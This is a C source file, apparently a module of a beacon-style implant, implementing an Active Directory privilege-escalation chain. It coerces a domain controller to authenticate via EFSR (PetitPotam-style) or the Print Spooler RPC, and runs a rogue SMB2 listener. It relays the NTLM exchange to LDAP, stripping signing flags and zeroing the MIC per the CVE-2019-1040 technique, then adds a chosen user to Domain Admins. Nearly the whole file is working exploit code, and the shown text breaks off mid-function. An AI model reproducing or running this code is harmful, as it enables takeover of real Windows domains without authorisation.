// cmd_ldap_relay.c — EFSR TOCTOU coercion + SMB2 listener + NTLM relay -> LDAP -> Domain Admins
//
// Flow:
//   Thread A (smb2_listener): port listen_port, accepts DC$ SMB2 auth
//     Negotiate -> SessionSetup round1 (NTLMSSP_NEGOTIATE)
//     -> relay to LDAP -> get CHALLENGE
//     -> SessionSetup round2 (NTLMSSP_AUTH)
//     -> relay to LDAP -> bind success
//   Thread B (efsr_coerce): EfsRpcOpenFileRaw on dc_ip with UNC pointing to beacon_ip
//     DC calls NetShareGetInfo as MACHINE$ -> authenticates to us
//   Main thread: orchestrates relay, then ldap_modify(group_dn, user_dn)
//
// KV params: dc_ip, beacon_ip, user_dn, group_dn, listen_port(optional,def=445)

#include "../core/beacon.h"
#include "efsr.h"
#include "rprn.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <rpc.h>
#include <rpcdce.h>

// MIDL allocator hooks — redirect to beacon heap
void __RPC_FAR * __RPC_USER MIDL_user_allocate(size_t len) { return bmalloc(len); }
void __RPC_USER  MIDL_user_free(void __RPC_FAR * ptr)      { bfree(ptr); }

// Flush output buffer immediately without ending the task stream.
static void out_flush_now(void) { out_flush_chunk(get_transport(), 0); }

// Diagnostic hex dump: writes "[label] N bytes:\n<hex rows>\n" then flushes.
static void dump_hex(const char *label, const uint8_t *data, uint32_t len) {
    static const char hex[] = "0123456789ABCDEF";
    char hdr[128]; uint32_t hl = 0;
    while (label[hl] && hl < 64) { hdr[hl] = label[hl]; hl++; }
    hdr[hl++] = ' '; hdr[hl++] = 'l'; hdr[hl++] = 'e'; hdr[hl++] = 'n'; hdr[hl++] = '=';
    char tmp[12]; int tl = 0; uint32_t v = len;
    if (!v) tmp[tl++] = '0'; else while (v) { tmp[tl++] = '0' + (char)(v%10); v /= 10; }
    while (tl) hdr[hl++] = tmp[--tl];
    hdr[hl++] = '\n';
    out_write(hdr, hl);

    char row[80]; uint32_t cap = len < 256 ? len : 256;
    for (uint32_t i = 0; i < cap; i += 16) {
        uint32_t rl = 0;
        for (uint32_t j = 0; j < 16 && i + j < cap; j++) {
            row[rl++] = hex[data[i+j] >> 4];
            row[rl++] = hex[data[i+j] & 0xf];
            row[rl++] = ' ';
        }
        row[rl++] = '\n';
        out_write(row, rl);
    }
    out_flush_now();
}

// Implicit binding handles for MIDL-generated stubs.
handle_t hBinding;      // MS-EFSR (efsr_c.c)
handle_t hRprnBinding;  // MS-RPRN (rprn_c.c)

// __C_specific_handler is required by x64 SEH (__try/__except) which RpcTryExcept
// expands to. CRT provides it normally, but beacon is /NODEFAULTLIB.
// DISPATCHER_CONTEXT is x64-only; on x86 the compiler uses a different SEH ABI
// that doesn't need this forwarder.
#ifdef _WIN64
typedef EXCEPTION_DISPOSITION (WINAPI *PFN_CSH)(
    EXCEPTION_RECORD*, void*, CONTEXT*, DISPATCHER_CONTEXT*);

EXCEPTION_DISPOSITION __cdecl __C_specific_handler(
    EXCEPTION_RECORD   *er,
    void               *frame,
    CONTEXT            *ctx,
    DISPATCHER_CONTEXT *dctx)
{
    static PFN_CSH fn = NULL;
    if (!fn) {
        HMODULE h = GetModuleHandleA("ntdll.dll");
        if (h) fn = (PFN_CSH)GetProcAddress(h, "__C_specific_handler");
    }
    return fn ? fn(er, frame, ctx, dctx) : ExceptionContinueSearch;
}
#endif /* _WIN64 */

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

#define SMB2_CMD_NEGOTIATE     0x0000
#define SMB2_CMD_SESSION_SETUP 0x0001
#define STATUS_MORE_PROCESSING 0xC0000016UL
#define STATUS_SUCCESS         0x00000000UL

#define NTLM_SIG "NTLMSSP\0"
#define MAX_TOKEN 8192u
#define MAX_LDAP  65536u
#define RELAY_TIMEOUT_MS 30000

// ---------------------------------------------------------------------------
// Relay context (shared between threads)
// ---------------------------------------------------------------------------

typedef struct {
    char   dc_ip[64];
    char   beacon_ip[64];
    char   user_dn[512];
    char   group_dn[512];
    USHORT listen_port;

    uint8_t *neg_token;   uint32_t neg_len;
    uint8_t *chal_token;  uint32_t chal_len;
    uint8_t *auth_token;  uint32_t auth_len;

    volatile LONG coerce_done;  // set by efsr_coerce_thread after attempt
    HANDLE evt_listening;   // set after bind+listen succeed
    HANDLE evt_neg_ready;
    HANDLE evt_chal_ready;
    HANDLE evt_auth_ready;
    HANDLE evt_relay_done;
    DWORD  bind_wsa_err;    // WSAGetLastError() if bind failed
} RelayCtx;

static RelayCtx g_ctx;

// ---------------------------------------------------------------------------
// BER helpers
// ---------------------------------------------------------------------------

static uint8_t *ber_put_len(uint8_t *p, uint32_t n) {
    if (n < 0x80)        { *p++ = (uint8_t)n; }
    else if (n < 0x100)  { *p++ = 0x81; *p++ = (uint8_t)n; }
    else                 { *p++ = 0x82; *p++ = (uint8_t)(n>>8); *p++ = (uint8_t)n; }
    return p;
}

static uint32_t ber_read_len(const uint8_t *p, uint32_t *used) {
    if (*p < 0x80) { *used = 1; return *p; }
    if (*p == 0x81) { *used = 2; return p[1]; }
    if (*p == 0x82) { *used = 3; return ((uint32_t)p[1]<<8)|p[2]; }
    if (*p == 0x83) { *used = 4; return ((uint32_t)p[1]<<16)|((uint32_t)p[2]<<8)|p[3]; }
    *used = 5; return ((uint32_t)p[1]<<24)|((uint32_t)p[2]<<16)|((uint32_t)p[3]<<8)|p[4];
}

static uint32_t ber_hdr_sz(uint32_t n) {
    return n < 0x80 ? 2u : n < 0x100 ? 3u : 4u;
}

static uint8_t *ber_octet(uint8_t *p, const uint8_t *data, uint32_t len) {
    *p++ = 0x04; p = ber_put_len(p, len);
    rt_memcpy(p, data, len); return p + len;
}

static uint8_t *ber_int(uint8_t *p, int v) {
    *p++ = 0x02; *p++ = 0x01; *p++ = (uint8_t)v; return p;
}

// ---------------------------------------------------------------------------
// SPNEGO helpers
// ---------------------------------------------------------------------------

// negTokenInit advertising NTLMSSP only (30 bytes)
static const uint8_t k_spnego_init[] = {
    0x60,0x1c,                                              // APPLICATION[0] len=28
    0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,               // SPNEGO OID
    0xa0,0x12,                                              // context[0] len=18
    0x30,0x10,                                              // SEQUENCE
    0xa0,0x0e,                                              // mechTypes context
    0x30,0x0c,                                              // SEQUENCE
    0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a // NTLMSSP OID
};

// Find NTLMSSP\0 signature in SPNEGO blob, return pointer + length
static int spnego_extract(const uint8_t *blob, uint32_t blen,
                           const uint8_t **out, uint32_t *olen) {
    for (uint32_t i = 0; i + 8 <= blen; i++) {
        if (rt_memcmp(blob + i, NTLM_SIG, 8) == 0) {
            *out  = blob + i;
            *olen = blen - i;
            return 1;
        }
    }
    return 0;
}

// Build negTokenResp wrapping NTLMSSP challenge
static uint32_t spnego_wrap_challenge(const uint8_t *chal, uint32_t clen,
                                       uint8_t *out, uint32_t cap) {
    // a1 { 30 { a0 03 0a 01 01, a2 { 04 chal } } }
    uint32_t oct   = ber_hdr_sz(clen) + clen;              // 04 len chal
    uint32_t a2c   = oct;
    uint32_t a2    = ber_hdr_sz(a2c) + a2c;
    uint32_t negst = 5;                                     // a0 03 0a 01 01
    uint32_t seqc  = negst + a2;
    uint32_t seq   = ber_hdr_sz(seqc) + seqc;
    uint32_t total = ber_hdr_sz(seq) + seq;
    if (total > cap) return 0;

    uint8_t *p = out;
    *p++ = 0xa1; p = ber_put_len(p, seq);
    *p++ = 0x30; p = ber_put_len(p, seqc);
    // negState = accept-incomplete
    *p++ = 0xa0; *p++ = 0x03; *p++ = 0x0a; *p++ = 0x01; *p++ = 0x01;
    // responseToken
    *p++ = 0xa2; p = ber_put_len(p, a2c);
    p = ber_octet(p, chal, clen);
    return (uint32_t)(p - out);
}

// Strip NTLMSSP_NEGOTIATE_SIGN/SEAL/ALWAYS_SIGN from a NegotiateFlags DWORD at given offset.
// Used to neuter NTLM signing on the LDAP side so the DC won't enforce signed PDUs.
static void strip_sign_flags(uint8_t *ntlm, uint32_t flag_off) {
    uint32_t f = (uint32_t)ntlm[flag_off]
               | ((uint32_t)ntlm[flag_off+1] << 8)
               | ((uint32_t)ntlm[flag_off+2] << 16)
               | ((uint32_t)ntlm[flag_off+3] << 24);
    f &= ~(0x00000010u | 0x00000020u | 0x00008000u);  // SIGN | SEAL | ALWAYS_SIGN
    ntlm[flag_off]   = (uint8_t)(f);
    ntlm[flag_off+1] = (uint8_t)(f >> 8);
    ntlm[flag_off+2] = (uint8_t)(f >> 16);
    ntlm[flag_off+3] = (uint8_t)(f >> 24);
}

// Neuter MIC verification in NTLMSSP_AUTHENTICATE (CVE-2019-1040 technique):
//   1) Zero the MIC field at NTLMSSP offset 72..87
//   2) Clear bit 0x02 (MIC present) in MsvAvFlags AV-pair inside temp/AvPairs
// On unpatched servers the auth then validates without MIC check, allowing us
// to also strip SIGN flags without breaking the bind.
static void neuter_auth_mic(uint8_t *auth, uint32_t auth_len) {
    if (auth_len < 88) return;

    // NtChallengeResponseFields at NTLMSSP offset 20..27
    uint16_t nt_len = (uint16_t)(auth[20] | ((uint16_t)auth[21] << 8));
    uint32_t nt_off = (uint32_t)auth[24]
                    | ((uint32_t)auth[25] << 8)
                    | ((uint32_t)auth[26] << 16)
                    | ((uint32_t)auth[27] << 24);
    if ((uint64_t)nt_off + nt_len > auth_len || nt_len < 44) goto zero_mic;

    // temp starts at NtChalResp offset 16 (after 16-byte NtProofStr); AVPairs at temp+28
    uint32_t avp = nt_off + 16 + 28;
    uint32_t end = nt_off + nt_len;
    while (avp + 4 <= end) {
        uint16_t av_id  = (uint16_t)(auth[avp]   | ((uint16_t)auth[avp+1] << 8));
        uint16_t av_len = (uint16_t)(auth[avp+2] | ((uint16_t)auth[avp+3] << 8));
        if (av_id == 0) break;  // MsvAvEOL
        if ((uint64_t)avp + 4 + av_len > end) break;
        if (av_id == 6 && av_len == 4) {                // MsvAvFlags
            uint32_t f = (uint32_t)auth[avp+4]
                       | ((uint32_t)auth[avp+5] << 8)
                       | ((uint32_t)auth[avp+6] << 16)
                       | ((uint32_t)auth[avp+7] << 24);
            f &= ~0x00000002u;                           // clear "MIC present"
            auth[avp+4] = (uint8_t)f;
            auth[avp+5] = (uint8_t)(f >> 8);
            auth[avp+6] = (uint8_t)(f >> 16);
            auth[avp+7] = (uint8_t)(f >> 24);
            break;
        }
        avp += 4 + av_len;
    }

zero_mic:
    // MIC field is 16 bytes at NTLMSSP offset 72 (right after Version[8])
    for (int i = 72; i < 88; i++) auth[i] = 0;
}

// Find NTLMSSP signature inside a SPNEGO blob and return mutable pointer to
// the embedded NTLMSSP message + remaining length. Same logic as spnego_extract
// but exposes a non-const pointer for in-place modification.
static int spnego_extract_mut(uint8_t *blob, uint32_t blen,
                                uint8_t **out, uint32_t *olen) {
    for (uint32_t i = 0; i + 8 <= blen; i++) {
        if (rt_memcmp(blob + i, NTLM_SIG, 8) == 0) {
            *out  = blob + i;
            *olen = blen - i;
            return 1;
        }
    }
    return 0;
}

// Build SPNEGO negTokenInit wrapping raw NTLMSSP NEGOTIATE for LDAP round 1
// 60 { SPNEGO_OID, a0 { 30 { a0{mechTypes:[NTLMSSP]}, a2{04 neg} } } }
static uint32_t spnego_wrap_negotiate(const uint8_t *neg, uint32_t nlen,
                                       uint8_t *out, uint32_t cap) {
    static const uint8_t spnego_oid[] = {0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02};
    static const uint8_t ntlm_oid[]   = {0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a};

    uint32_t mech_seq_c = 12;
    uint32_t mech_seq   = ber_hdr_sz(mech_seq_c) + mech_seq_c;  // 30 0c OID
    uint32_t a0m        = ber_hdr_sz(mech_seq) + mech_seq;       // a0 len seqm

    uint32_t tok_oct = ber_hdr_sz(nlen) + nlen;                  // 04 len neg
    uint32_t a2_c    = tok_oct;
    uint32_t a2      = ber_hdr_sz(a2_c) + a2_c;                  // a2 len {tok_oct}

    uint32_t seq_c   = a0m + a2;
    uint32_t seq     = ber_hdr_sz(seq_c) + seq_c;
    uint32_t ctx0    = ber_hdr_sz(seq) + seq;
    uint32_t app_c   = 8 + ctx0;
    uint32_t total   = ber_hdr_sz(app_c) + app_c;
    if (total > cap) return 0;

    uint8_t *p = out;
    *p++ = 0x60; p = ber_put_len(p, app_c);
    rt_memcpy(p, spnego_oid, 8); p += 8;
    *p++ = 0xa0; p = ber_put_len(p, seq);
    *p++ = 0x30; p = ber_put_len(p, seq_c);
    *p++ = 0xa0; p = ber_put_len(p, mech_seq);
    *p++ = 0x30; p = ber_put_len(p, mech_seq_c);
    rt_memcpy(p, ntlm_oid, 12); p += 12;
    *p++ = 0xa2; p = ber_put_len(p, a2_c);
    p = ber_octet(p, neg, nlen);
    return (uint32_t)(p - out);
}

// Build SPNEGO negTokenResp wrapping raw NTLMSSP AUTH for LDAP round 2
// a1 { 30 { a2 { 04 auth } } }
static uint32_t spnego_wrap_auth(const uint8_t *auth, uint32_t alen,
                                  uint8_t *out, uint32_t cap) {
    uint32_t oct   = ber_hdr_sz(alen) + alen;
    uint32_t a2c   = oct;
    uint32_t a2    = ber_hdr_sz(a2c) + a2c;
    uint32_t seqc  = a2;
    uint32_t seq   = ber_hdr_sz(seqc) + seqc;
    uint32_t total = ber_hdr_sz(seq) + seq;
    if (total > cap) return 0;

    uint8_t *p = out;
    *p++ = 0xa1; p = ber_put_len(p, seq);
    *p++ = 0x30; p = ber_put_len(p, seqc);
    *p++ = 0xa2; p = ber_put_len(p, a2c);
    p = ber_octet(p, auth, alen);
    return (uint32_t)(p - out);
}

// ---------------------------------------------------------------------------
// SMB2 structures
// ---------------------------------------------------------------------------

#pragma pack(push,1)
typedef struct {
    uint8_t  proto[4];
    uint16_t hdr_len;
    uint16_t credit_charge;
    uint32_t status;
    uint16_t command;
    uint16_t credit_resp;
    uint32_t flags;
    uint32_t next_cmd;
    uint64_t msg_id;
    uint32_t reserved;
    uint32_t tree_id;
    uint64_t session_id;
    uint8_t  signature[16];
} Smb2Hdr;

typedef struct {
    uint16_t struct_size;    // 65
    uint16_t security_mode;  // 0x01 = signing enabled (not required)
    uint16_t dialect;        // DialectRevision
    uint16_t reserved;       // 0 (NegotiateContextCount for SMB3.1.1)
    uint8_t  server_guid[16];
    uint32_t capabilities;
    uint32_t max_transact;
    uint32_t max_read;
    uint32_t max_write;
    uint64_t system_time;
    uint64_t start_time;
    uint16_t sec_offset;
    uint16_t sec_length;
    uint32_t neg_ctx_offset;
} Smb2NegResp;

typedef struct {
    uint16_t struct_size;   // 25
    uint8_t  flags;
    uint8_t  security_mode;
    uint32_t capabilities;
    uint32_t channel;
    uint16_t sec_offset;
    uint16_t sec_length;
    uint64_t prev_session;
} Smb2SsReq;

typedef struct {
    uint16_t struct_size;   // 9
    uint16_t session_flags;
    uint16_t sec_offset;
    uint16_t sec_length;
} Smb2SsResp;
#pragma pack(pop)

// ---------------------------------------------------------------------------
// NetBIOS framing
// ---------------------------------------------------------------------------

static int nb_recv(SOCKET s, uint8_t *buf, uint32_t cap, uint32_t *out) {
    uint8_t h[4];
    if (recv(s,(char*)h,4,MSG_WAITALL) != 4) return 0;
    uint32_t len = ((uint32_t)h[1]<<16)|((uint32_t)h[2]<<8)|h[3];
    if (len > cap) return 0;
    if (recv(s,(char*)buf,(int)len,MSG_WAITALL) != (int)len) return 0;
    *out = len;
    return 1;
}

static int nb_send(SOCKET s, const uint8_t *data, uint32_t len) {
    uint8_t h[4] = {0x00,(uint8_t)(len>>16),(uint8_t)(len>>8),(uint8_t)len};
    if (send(s,(char*)h,4,0) != 4) return 0;
    uint32_t sent = 0;
    while (sent < len) {
        int r = send(s,(char*)data+sent,(int)(len-sent),0);
        if (r <= 0) return 0;
        sent += r;
    }
    return 1;
}

// ---------------------------------------------------------------------------
// SMB2 response builders
// ---------------------------------------------------------------------------

static uint32_t smb2_neg_response(uint64_t msg_id, uint8_t *out) {
    Smb2Hdr *h = (Smb2Hdr*)out;
    rt_memset(h, 0, sizeof(Smb2Hdr));
    h->proto[0]=0xFE; h->proto[1]='S'; h->proto[2]='M'; h->proto[3]='B';
    h->hdr_len=64; h->status=STATUS_SUCCESS;
    h->command=SMB2_CMD_NEGOTIATE; h->credit_resp=1;
    h->flags=0x00000001; h->msg_id=msg_id;

    Smb2NegResp *r = (Smb2NegResp*)(out+64);
    rt_memset(r, 0, sizeof(Smb2NegResp));
    r->struct_size=65;
    r->security_mode=0x01;  // SMB2_NEGOTIATE_SIGNING_ENABLED
    r->dialect=0x0202;
    r->reserved=0;
    bc_random(r->server_guid, 16);
    r->capabilities=0x01;
    r->max_transact=r->max_read=r->max_write=0x800000;
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    r->system_time = ((uint64_t)ft.dwHighDateTime<<32)|ft.dwLowDateTime;
    r->start_time  = r->system_time;

    uint16_t soff = 64 + (uint16_t)sizeof(Smb2NegResp);
    while (soff & 7) soff++;
    r->sec_offset = soff;
    r->sec_length = (uint16_t)sizeof(k_spnego_init);
    rt_memcpy(out+soff, k_spnego_init, sizeof(k_spnego_init));
    return soff + sizeof(k_spnego_init);
}

static uint32_t smb2_sesssetup_response(uint64_t msg_id, uint64_t session_id,
                                         uint32_t status,
                                         const uint8_t *sec, uint16_t sec_len,
                                         uint8_t *out) {
    Smb2Hdr *h = (Smb2Hdr*)out;
    rt_memset(h, 0, sizeof(Smb2Hdr));
    h->proto[0]=0xFE; h->proto[1]='S'; h->proto[2]='M'; h->proto[3]='B';
    h->hdr_len=64; h->status=status;
    h->command=SMB2_CMD_SESSION_SETUP; h->credit_resp=1;
    h->flags=0x00000001; h->msg_id=msg_id; h->session_id=session_id;

    Smb2SsResp *r = (Smb2SsResp*)(out+64);
    r->struct_size=9; r->session_flags=0;
    r->sec_offset=64+8; r->sec_length=sec_len;
    if (sec && sec_len) rt_memcpy(out+64+8, sec, sec_len);
    return 64+8+sec_len;
}

// ---------------------------------------------------------------------------
// LDAP helpers
// ---------------------------------------------------------------------------

static SOCKET ldap_connect_ip(const char *ip) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    DWORD tmo = RELAY_TIMEOUT_MS;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tmo, sizeof(tmo));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tmo, sizeof(tmo));
    struct sockaddr_in sa;
    rt_memset(&sa, 0, sizeof(sa));
    sa.sin_family=AF_INET; sa.sin_port=htons(389);
    inet_pton(AF_INET, ip, &sa.sin_addr);
    if (connect(s,(struct sockaddr*)&sa,sizeof(sa)) != 0) { closesocket(s); return INVALID_SOCKET; }
    return s;
}

static int ldap_xchg(SOCKET s, const uint8_t *req, uint32_t rlen,
                      uint8_t *resp, uint32_t *resp_len) {
    if (send(s,(const char*)req,(int)rlen,0) != (int)rlen) return 0;
    int r = recv(s,(char*)resp,(int)*resp_len,0);
    if (r <= 0) return 0;
    *resp_len = (uint32_t)r;
    return 1;
}

// Build LDAP BindRequest SASL NTLM, msg_id=1 or 2
static uint32_t ldap_bind(uint8_t *out, int msg_id,
                            const uint8_t *tok, uint32_t tok_len) {
    // sasl: [3] { OctetStr("GSS-SPNEGO"), OctetStr(tok) }
    static const uint8_t mech[] = {'G','S','S','-','S','P','N','E','G','O'};
    uint32_t mech_t  = ber_hdr_sz(10) + 10;             // 04 0a GSS-SPNEGO
    uint32_t cred_t  = ber_hdr_sz(tok_len) + tok_len;   // 04 len tok
    uint32_t sasl_c  = mech_t + cred_t;
    uint32_t sasl_t  = ber_hdr_sz(sasl_c) + sasl_c;
    uint32_t bind_c  = 3 + 2 + sasl_t;                 // INT(3) + OCTET("") + sasl
    uint32_t bind_t  = ber_hdr_sz(bind_c) + bind_c;
    uint32_t msg_c   = 3 + bind_t;
    uint8_t *p = out;
    *p++ = 0x30; p = ber_put_len(p, msg_c);
    p = ber_int(p, msg_id);
    *p++ = 0x60; p = ber_put_len(p, bind_c);
    p = ber_int(p, 3);                                  // version=3
    *p++ = 0x04; *p++ = 0x00;                           // name=""
    *p++ = 0xa3; p = ber_put_len(p, sasl_c);
    *p++ = 0x04; *p++ = 0x0a; rt_memcpy(p,mech,10); p+=10;
    p = ber_octet(p, tok, tok_len);
    return (uint32_t)(p - out);
}

// Returns 1=saslBindInProgress (creds set to serverSaslCreds), 2=success, 0=error
static int ldap_parse_bind(const uint8_t *buf, uint32_t len,
                             const uint8_t **creds, uint32_t *creds_len) {
    // Find resultCode first (ENUMERATED 0x0A inside BindResponse)
    int rc = -1;
    for (uint32_t i = 2; i+3 <= len; i++) {
        if (buf[i] == 0x0a && buf[i+1] >= 0x01) { rc = buf[i+2]; break; }
    }
    if (rc == 0) return 2;                          // bind success
    if (rc == 14) {                                 // saslBindInProgress → get [7]
        for (uint32_t i = 0; i+2 <= len; i++) {
            if (buf[i] == 0x87) {
                uint32_t used; uint32_t clen = ber_read_len(buf+i+1, &used);
                if (clen > 0 && i+1+used+clen <= len) {
                    *creds = buf+i+1+used; *creds_len = clen; return 1;
                }
            }
        }
    }
    return 0;
}

// Build LDAP ModifyRequest: add member=user_dn to group_dn
static uint32_t ldap_modify(uint8_t *out, int msg_id,
                              const char *group_dn, const char *user_dn) {
    uint32_t gdn = (uint32_t)rt_strlen(group_dn);
    uint32_t udn = (uint32_t)rt_strlen(user_dn);
    // SET { OCTET(user_dn) }
    uint32_t set_c = ber_hdr_sz(udn) + udn;
    uint32_t set_t = ber_hdr_sz(set_c) + set_c;
    // PartialAttr SEQUENCE { OCTET("member"), SET }
    uint32_t attr_c = 8 + set_t;                       // 04 06 member = 8 bytes
    uint32_t attr_t = ber_hdr_sz(attr_c) + attr_c;
    // change SEQUENCE { ENUM(0), attr }
    uint32_t chg_c  = 3 + attr_t;
    uint32_t chg_t  = ber_hdr_sz(chg_c) + chg_c;
    // changes SEQUENCE { change }
    uint32_t chgs_c = chg_t;
    uint32_t chgs_t = ber_hdr_sz(chgs_c) + chgs_c;
    // ModifyRequest [APPLICATION 6] { OCTET(group_dn), changes }
    uint32_t mod_c  = ber_hdr_sz(gdn) + gdn + chgs_t;
    uint32_t mod_t  = ber_hdr_sz(mod_c) + mod_c;
    uint32_t msg_c  = 3 + mod_t;

    uint8_t *p = out;
    *p++ = 0x30; p = ber_put_len(p, msg_c);
    p = ber_int(p, msg_id);
    *p++ = 0x66; p = ber_put_len(p, mod_c);            // [APPLICATION 6]
    p = ber_octet(p, (const uint8_t*)group_dn, gdn);
    *p++ = 0x30; p = ber_put_len(p, chgs_c);
    *p++ = 0x30; p = ber_put_len(p, chg_c);
    *p++ = 0x0a; *p++ = 0x01; *p++ = 0x00;             // ENUM = 0 (add)
    *p++ = 0x30; p = ber_put_len(p, attr_c);
    *p++ = 0x04; *p++ = 0x06; rt_memcpy(p,"member",6); p+=6;
    *p++ = 0x31; p = ber_put_len(p, set_c);
    p = ber_octet(p, (const uint8_t*)user_dn, udn);
    return (uint32_t)(p - out);
}

static int ldap_result_code(const uint8_t *buf, uint32_t len) {
    for (uint32_t i = 2; i+5 < len; i++)
        if ((buf[i] & 0x60) == 0x60) {
            uint32_t used; ber_read_len(buf+i+1, &used);
            uint32_t off = i+1+used;
            if (off+3 <= len && buf[off]==0x0a && buf[off+1]>=0x01)
                return buf[off+2];
        }
    return -1;
}

// ---------------------------------------------------------------------------
// Print Spooler (MS-RPRN) coercion — fallback when EFSR is patched
// ---------------------------------------------------------------------------

// spooler_coerce — uses RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)
// which explicitly passes pszLocalMachine = \\listener_ip so the DC connects
// back to us as MACHINE$ over SMB on port 445. Win32 FindFirstPrinterChange-
// Notification does NOT pass this parameter and may connect to the wrong host.
static void spooler_coerce(const wchar_t *dc_server, const wchar_t *listener_ip) {
    RPC_WSTR bstr = NULL;
    if (RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncacn_np",
            (RPC_WSTR)dc_server, (RPC_WSTR)L"\\pipe\\spoolss",
            NULL, &bstr) != RPC_S_OK) {
        out_write("[spooler] RpcStringBindingCompose failed\n", 40); return;
    }
    if (RpcBindingFromStringBindingW(bstr, &hRprnBinding) != RPC_S_OK) {
        RpcStringFreeW(&bstr);
        out_write("[spooler] RpcBindingFromStringBinding failed\n", 44); return;
    }
    RpcStringFreeW(&bstr);
    RpcBindingSetAuthInfoW(hRprnBinding, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, NULL, RPC_C_AUTHZ_NONE);

    PRINTER_HANDLE hPrinter = NULL;
    DEVMODE_CONTAINER devc;
    rt_memset(&devc, 0, sizeof(devc));

    RpcTryExcept {
        DWORD err = RpcOpenPrinter((wchar_t*)dc_server, &hPrinter, NULL, &devc, 0);
        if (err != 0 || !hPrinter) {
            char m[]="[spooler] RpcOpenPrinter err=XXXXXXXXXX\n";
            {DWORD e=err;char t[12];int tl=0;
             if(!e){t[tl++]='0';}else{while(e){t[tl++]='0'+(char)(e%10);e/=10;}}
             int p=24;for(int ri=tl-1;ri>=0;ri--)m[p++]=t[ri];m[p++]='\n';m[p]=0;
             out_write(m,p);}
            goto sp_done;
        }
        out_write("[spooler] RpcOpenPrinter OK — sending notification\n", 51);

        // pszLocalMachine = \\listener_ip — DC connects here as MACHINE$
        wchar_t local[130] = {L'\\', L'\\'};
        int k = 0;
        while (listener_ip[k] && k < 63) { local[2+k] = listener_ip[k]; k++; }
        local[2+k] = 0;

        DWORD nerr = RpcRemoteFindFirstPrinterChangeNotificationEx(
            hPrinter, 0x00000001 /*PRINTER_CHANGE_ADD_JOB*/, 0, local, 0, NULL);
        char m2[]="[spooler] RFFPCNEX ret=XXXXXXXXXX\n";
        {DWORD e=nerr;char t[12];int tl=0;
         if(!e){t[tl++]='0';}else{while(e){t[tl++]='0'+(char)(e%10);e/=10;}}
         int p=22;for(int ri=tl-1;ri>=0;ri--)m2[p++]=t[ri];m2[p++]='\n';m2[p]=0;
         out_write(m2,p);}
    }
    RpcExcept(1) {
        unsigned long ex = RpcExceptionCode();
        char m[]="[spooler] RPC exception=XXXXXXXXXX\n";
        {DWORD e=ex;char t[12];int tl=0;
         if(!e){t[tl++]='0';}else{while(e){t[tl++]='0'+(char)(e%10);e/=10;}}
         int p=24;for(int ri=tl-1;ri>=0;ri--)m[p++]=t[ri];m[p++]='\n';m[p]=0;
         out_write(m,p);}
    }
    RpcEndExcept

sp_done:
    RpcBindingFree(&hRprnBinding);
    out_write("[spooler] done\n", 15);
}

// ---------------------------------------------------------------------------
// EFSR coercion thread (x64 only: MIDL stubs и RpcTryExcept требуют x64 CRT)
// ---------------------------------------------------------------------------
#ifdef _WIN64

typedef struct { char target[64]; char listener[64]; USHORT port; } CoerceArgs;

static DWORD WINAPI efsr_coerce_thread(LPVOID param) {
    CoerceArgs *a = (CoerceArgs*)param;
    Sleep(800);                                         // let listener bind first
    out_write("[efsr] coercion thread started\n", 31);

    wchar_t w_server[130] = {L'\\',L'\\'};
    int i;
    for (i = 0; a->target[i] && i < 63; i++)
        w_server[2+i] = (wchar_t)(unsigned char)a->target[i];
    w_server[2+i] = 0;

    // UNC: \\beacon_ip\share\file.txt — port omitted intentionally.
    // NetShareGetInfo (called by EFS before impersonation) always connects via
    // SMB on port 445 regardless of what port we listen on. The @port UNC
    // syntax routes to WebDAV (HTTP), not SMB — so we never omit port here.
    wchar_t unc[260] = {L'\\',L'\\'};
    int j;
    for (j = 0; a->listener[j] && j < 63; j++)
        unc[2+j] = (wchar_t)(unsigned char)a->listener[j];
    const wchar_t *sfx = L"\\share\\file.txt";
    for (i = 0; sfx[i]; i++) unc[2+j+i] = sfx[i];
    unc[2+j+i] = 0;

    const wchar_t *pipes[] = {L"\\pipe\\efsrpc", L"\\pipe\\lsarpc", NULL};
    for (int pi = 0; pipes[pi]; pi++) {
        RPC_WSTR bstr = NULL;
        if (RpcStringBindingComposeW(NULL,(RPC_WSTR)L"ncacn_np",
                (RPC_WSTR)w_server,(RPC_WSTR)pipes[pi],NULL,&bstr) != RPC_S_OK) continue;
        if (RpcBindingFromStringBindingW(bstr,&hBinding) != RPC_S_OK) {
            RpcStringFreeW(&bstr); continue;
        }
        RpcStringFreeW(&bstr);
        RpcBindingSetAuthInfoW(hBinding,NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_AUTHN_WINNT,NULL,RPC_C_AUTHZ_NONE);
        out_write("[efsr] calling EfsRpcOpenFileRaw\n", 32);
        RpcTryExcept {
            long ctx = 0;
            long ret = EfsRpcOpenFileRaw(hBinding, &ctx, unc, 0);
            // 53=BAD_NETPATH: DC connected to listener (hash captured)
            // 67=BAD_NET_NAME: SMB connected, share not found (hash captured)
            //  5=ACCESS_DENIED: hash captured
            // 1707=NOT_FOUND: EFS pipe refused call (patched/not exposed)
            char rmsg[] = "[efsr] return code: XXXXXXXXXX\n";
            // write decimal ret into rmsg at offset 20
            {
                long rv = ret < 0 ? ret : ret;
                char tmp[16]; int tl=0;
                if (rv == 0) { tmp[tl++]='0'; }
                else {
                    long v = rv < 0 ? -rv : rv;
                    while(v){ tmp[tl++]='0'+(char)(v%10); v/=10; }
                    if (rv < 0) tmp[tl++]='-';
                }
                int pos = 20;
                for(int ri=tl-1;ri>=0;ri--) rmsg[pos++]=tmp[ri];
                rmsg[pos++]='\n'; rmsg[pos]=0;
                out_write(rmsg, pos);
            }
        }
        RpcExcept(1) {
            unsigned long ex = RpcExceptionCode();
            char emsg[] = "[efsr] RPC exception: XXXXXXXXXX\n";
